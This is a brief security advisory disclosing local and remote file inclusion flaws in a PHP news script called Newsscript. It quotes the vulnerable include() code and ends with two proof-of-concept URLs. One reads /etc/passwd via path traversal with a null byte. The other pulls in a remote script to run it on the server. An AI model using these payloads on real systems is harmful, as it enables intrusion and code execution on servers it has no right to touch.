#  Vulnerability : Remote &amp; local File Inclusion

#  Risk : High

---------------------------------------------------------------------------------------------------------


#  Description :

Newsscript is a PHP script to manage news items on website without Database.


#  Vulnerable Code :

The first issue is due to an input validation error in the &quot;print/print.php&quot; script that does not validate the &quot;ide&quot; parameter, which could be exploited by remote attackers to include local files with the privileges of the web server.

1    &lt;html&gt;
2    &lt;head&gt;
3    &lt;?
4 $file_name = &quot;../&quot;.$ide.&quot;.txt&quot;;
5    ?&gt;


27    include($file_name);


The second flaw is due to an input validation error in the &quot;article.php&quot; script that does not validate the &quot;ide&quot; parameter, which could be exploited by attackers to include remote or local files and execute arbitrary commands with privileges of the web server.

1 &lt;?
2 include($ide.&quot;.txt&quot;);
3 ?&gt;


#  Exploit :

http://localhost/newscript/print/print.php?ide=../../../../etc/passwd%00

http://localhost/newscript/article.php?ide=http://site.com/script.txt ?
